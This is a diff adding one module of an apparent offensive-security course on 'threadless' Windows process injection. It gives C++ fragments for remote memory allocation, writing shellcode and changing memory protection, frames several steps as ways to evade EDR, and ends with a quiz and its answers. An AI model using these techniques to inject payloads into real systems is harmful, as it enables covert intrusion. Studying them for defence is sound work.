@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: Memory Allocation in Remote Process - ThreadlessInject Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9F5;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#14b8a6;--accent2:#0d9488;--gradient:linear-gradient(135deg,#14b8a6,#0d9488)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ThreadlessInject Course</h2>
+<span>Threadless Injection Masterclass</span>
+</div>
+<a class="home-link" href="../ThreadlessInject_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> Thread Creation Problem</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Remote Function Hooking</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> Target Function Selection</a>
+<a class="mod-link active" href="module4.html"><span class="diff d2">4</span> Remote Memory Allocation</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">5</span> Hook Stub Architecture</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">6</span> Installing Remote Hook</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Execution &amp; Cleanup</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: Memory Allocation in Remote Process</h1>
+<p class="subtitle">Before you can hook anything, you need memory in the target process for your shellcode and stub.</p>
+
+<div class="card highlight">
+<h4>What Gets Written Where</h4>
+<p>ThreadlessInject needs to place three things into the target process: (1) the shellcode payload, (2) the hook stub that saves/restores registers and calls the shellcode, and (3) the saved original bytes from the hooked function along with a jump back. All of these are written into a single allocated memory region in the target process using cross-process memory APIs.</p>
+</div>
+
+<h2>Cross-Process Memory Allocation</h2>
+<p>To allocate memory in another process, you use <code>NtAllocateVirtualMemory</code> with the target process handle. This is the native API equivalent of <code>VirtualAllocEx</code> but operates at the syscall level, bypassing any userland hooks that EDR products may have placed on <code>kernel32.dll</code>.</p>
+
+<pre><code><span class="lang-tag">C++</span>// NtAllocateVirtualMemory - allocate memory in the remote process
+// This is what ThreadlessInject uses instead of VirtualAllocEx
+
+typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
+    HANDLE    ProcessHandle,   // Target process handle
+    PVOID    *BaseAddress,     // In/out: desired/actual base address
+    ULONG_PTR ZeroBits,        // Number of high-order zero bits in address
+    PSIZE_T   RegionSize,      // In/out: desired/actual size
+    ULONG     AllocationType,  // MEM_COMMIT | MEM_RESERVE
+    ULONG     Protect          // PAGE_READWRITE initially
+);
+
+// Usage in ThreadlessInject:
+PVOID remoteBase = NULL;
+SIZE_T regionSize = shellcodeLen + stubLen + originalBytesLen + 256; // padding
+
+NTSTATUS status = NtAllocateVirtualMemory(
+    hProcess,                       // Target process handle
+    &amp;remoteBase,                    // System chooses base address
+    0,                              // No address constraints
+    &amp;regionSize,                    // Total size needed
+    MEM_COMMIT | MEM_RESERVE,       // Commit immediately
+    PAGE_READWRITE                  // Start as RW (not executable yet)
+);</code></pre>
+
+<div class="card warn">
+<h4>Initial Protection: RW, Not RWX</h4>
+<p>Notice that the allocation uses <code>PAGE_READWRITE</code>, not <code>PAGE_EXECUTE_READWRITE</code>. Allocating RWX memory directly is a significant red flag that memory scanners detect. ThreadlessInject allocates as RW, writes all the data, and then changes the protection to RX (read-execute) before installing the hook. This avoids the RWX signature entirely and is a common evasion technique.</p>
+</div>
+
+<h2>Memory Layout in the Remote Process</h2>
+<p>ThreadlessInject organizes the allocated memory region with a specific layout. The hook stub comes first, followed by the shellcode payload, followed by the saved original bytes and the jump-back instruction:</p>
+
+<div class="diagram">
+<h4>Remote Memory Region Layout</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:550px;margin:0 auto">
+<div class="box hl" style="width:100%"><strong>Hook Stub</strong> (~50 bytes)<br><small>Save registers &rarr; call shellcode &rarr; restore registers</small></div>
+<div class="box y" style="width:100%"><strong>Shellcode Payload</strong> (variable size)<br><small>The actual payload (e.g., Cobalt Strike beacon shellcode)</small></div>
+<div class="box g" style="width:100%"><strong>Original Bytes</strong> (14 bytes saved from hooked function)<br><small>The overwritten prologue instructions</small></div>
+<div class="box" style="width:100%"><strong>Jump-Back</strong> (14 bytes)<br><small>JMP [RIP+0] + address of HookedFunc+14</small></div>
+</div>
+</div>
+
+<p>This layout is contiguous in memory, which means a single allocation and a single write operation can place everything. The hook stub knows the relative offset to the shellcode (it is immediately after the stub), and the original bytes block knows it must jump to <code>hookedFunction + 14</code> to resume normal execution.</p>
+
+<h2>Writing Data to the Remote Process</h2>
+<p>After allocation, you write the complete payload into the remote memory region using <code>NtWriteVirtualMemory</code>:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Step 1: Build the complete payload locally
+// Combine hook stub + shellcode + original bytes + jump-back into one buffer
+BYTE* localBuffer = (BYTE*)malloc(regionSize);
+
+// Copy hook stub at offset 0
+memcpy(localBuffer, hookStub, hookStubLen);
+
+// Copy shellcode immediately after
+memcpy(localBuffer + hookStubLen, shellcode, shellcodeLen);
+
+// Copy saved original bytes after shellcode
+memcpy(localBuffer + hookStubLen + shellcodeLen, originalBytes, 14);
+
+// Build jump-back to hookedFunc + 14
+BYTE jumpBack[14];
+jumpBack[0] = 0xFF; jumpBack[1] = 0x25;                    // JMP [RIP+0]
+*(DWORD*)(jumpBack + 2) = 0;                                // RIP-relative offset = 0
+*(UINT64*)(jumpBack + 6) = (UINT64)hookedFuncAddr + 14;     // Target: original func + 14
+memcpy(localBuffer + hookStubLen + shellcodeLen + 14, jumpBack, 14);
+
+// Step 2: Write the complete buffer to the remote process
+SIZE_T bytesWritten = 0;
+NtWriteVirtualMemory(
+    hProcess,           // Target process
+    remoteBase,         // Destination (allocated earlier)
+    localBuffer,        // Source (our local buffer)
+    regionSize,         // Total size
+    &amp;bytesWritten       // Bytes actually written
+);</code></pre>
+
+<h2>Memory Protection Management</h2>
+<p>After writing, the memory must be changed from <code>PAGE_READWRITE</code> to <code>PAGE_EXECUTE_READ</code>. This is done with <code>NtProtectVirtualMemory</code>:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Change protection: RW -> RX (read + execute, no write)
+ULONG oldProtect = 0;
+PVOID protectBase = remoteBase;
+SIZE_T protectSize = regionSize;
+
+NtProtectVirtualMemory(
+    hProcess,           // Target process
+    &amp;protectBase,       // Address to change
+    &amp;protectSize,       // Size of region
+    PAGE_EXECUTE_READ,  // New protection: RX
+    &amp;oldProtect         // Previous protection stored here
+);
+// Now the region is executable but not writable
+// The shellcode and hook stub can execute but cannot be easily modified</code></pre>
+
+<p>This two-step approach (allocate RW, write, change to RX) is a standard evasion pattern. It means at no point does the memory have simultaneous write and execute permissions, avoiding the RWX detection heuristic used by tools like Moneta.</p>
+
+<h2>Process Handle Requirements</h2>
+<p>All these cross-process operations require a handle to the target process with specific access rights. Here is the minimum set of rights needed:</p>
+
+<table>
+<tr><th>Access Right</th><th>Constant</th><th>Purpose</th></tr>
+<tr><td>VM Operation</td><td><code>PROCESS_VM_OPERATION</code></td><td>Required for NtAllocateVirtualMemory and NtProtectVirtualMemory</td></tr>
+<tr><td>VM Write</td><td><code>PROCESS_VM_WRITE</code></td><td>Required for NtWriteVirtualMemory</td></tr>
+<tr><td>VM Read</td><td><code>PROCESS_VM_READ</code></td><td>Required for NtReadVirtualMemory (reading original bytes)</td></tr>
+</table>
+
+<pre><code><span class="lang-tag">C++</span>// Opening the target process with minimum required rights
+HANDLE hProcess = OpenProcess(
+    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+    FALSE,
+    targetPid
+);
+// Note: PROCESS_ALL_ACCESS works but is more suspicious
+// Using minimum rights reduces the detection surface</code></pre>
+
+<div class="card">
+<h4>Detection Consideration: Handle Access Rights</h4>
+<p>EDR products monitor <code>OpenProcess</code> (via the kernel callback <code>ObRegisterCallbacks</code>) and flag processes that request suspicious access rights combinations. Requesting <code>PROCESS_ALL_ACCESS</code> to another process is an obvious red flag. Requesting specifically <code>PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ</code> is less common in legitimate software and still suspicious, but slightly less conspicuous than full access. Some operators combine ThreadlessInject with handle duplication or handle inheritance techniques to avoid the <code>OpenProcess</code> call entirely.</p>
+</div>
+
+<h2>Reading the Original Function Bytes</h2>
+<p>Before overwriting the target function's prologue with the hook JMP, you must save the original bytes. These are needed both for the trampoline (to execute them after the hook) and for the cleanup phase (to restore them after the shellcode runs once):</p>
+
+<pre><code><span class="lang-tag">C++</span>// Read the first 14 bytes of the target function in the remote process
+BYTE originalBytes[14] = {0};
+SIZE_T bytesRead = 0;
+
+NtReadVirtualMemory(
+    hProcess,                    // Target process
+    (PVOID)hookedFuncAddr,       // Address of target function
+    originalBytes,               // Buffer to store original bytes
+    14,                          // Read 14 bytes
+    &amp;bytesRead                   // Actual bytes read
+);
+
+// These 14 bytes will be:
+// 1. Embedded in the trampoline (to execute after hook code)
+// 2. Stored by the hook stub for restoration after first execution</code></pre>
+
+<div class="card green">
+<h4>Summary: The Memory Setup Sequence</h4>
+<p>The complete memory setup for ThreadlessInject follows this order: (1) Open the target process handle with VM rights. (2) Read the original 14 bytes from the target function. (3) Allocate a RW memory region in the target process. (4) Build the local buffer containing hook stub + shellcode + original bytes + jump-back. (5) Write the buffer to the remote allocation. (6) Change the protection from RW to RX. The allocated region is now ready, and the next step (Module 6) is to install the actual hook by overwriting the target function's prologue.</p>
+</div>
+
+<div class="quiz" id="quiz4">
+<h4>Pop Quiz: Remote Memory Allocation</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why does ThreadlessInject allocate memory as PAGE_READWRITE and then change it to PAGE_EXECUTE_READ?</p>
+<label data-opt="0"><input type="radio" name="q4_0"> PAGE_EXECUTE_READ does not allow initial writes</label>
+<label data-opt="1"><input type="radio" name="q4_0"> It is required by the Windows API specification</label>
+<label data-opt="2"><input type="radio" name="q4_0"> To avoid having RWX memory at any point, which is a detection heuristic</label>
+<label data-opt="3"><input type="radio" name="q4_0"> PAGE_READWRITE is faster for allocation</label>
+<div class="explain">Memory scanners like Moneta flag PAGE_EXECUTE_READWRITE (RWX) regions because legitimate programs rarely need them. By allocating as RW (writable but not executable), writing the payload, and then switching to RX (executable but not writable), ThreadlessInject ensures the memory is never simultaneously writable and executable.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: What process access rights are required for NtAllocateVirtualMemory on a remote process?</p>
+<label data-opt="0"><input type="radio" name="q4_1"> PROCESS_VM_OPERATION</label>
+<label data-opt="1"><input type="radio" name="q4_1"> PROCESS_CREATE_THREAD</label>
+<label data-opt="2"><input type="radio" name="q4_1"> PROCESS_QUERY_INFORMATION</label>
+<label data-opt="3"><input type="radio" name="q4_1"> PROCESS_SUSPEND_RESUME</label>
+<div class="explain">NtAllocateVirtualMemory and NtProtectVirtualMemory require PROCESS_VM_OPERATION. NtWriteVirtualMemory additionally requires PROCESS_VM_WRITE, and NtReadVirtualMemory requires PROCESS_VM_READ. Notably, PROCESS_CREATE_THREAD is NOT needed since ThreadlessInject never creates a thread.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q3: In the remote memory layout, what comes immediately after the shellcode payload?</p>
+<label data-opt="0"><input type="radio" name="q4_2"> Another copy of the hook stub</label>
+<label data-opt="1"><input type="radio" name="q4_2"> A NOP sled</label>
+<label data-opt="2"><input type="radio" name="q4_2"> The target function's complete code</label>
+<label data-opt="3"><input type="radio" name="q4_2"> The saved original bytes from the hooked function, followed by a jump-back instruction</label>
+<div class="explain">The memory layout is: hook stub, then shellcode, then the 14 saved original bytes from the hooked function's prologue, then a 14-byte JMP instruction that jumps back to the hooked function at offset +14 (continuing where the overwritten bytes left off).</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz4')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Previous: Target Function Selection</a>
+<a class="primary" href="module5.html">Next: Hook Stub Architecture &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
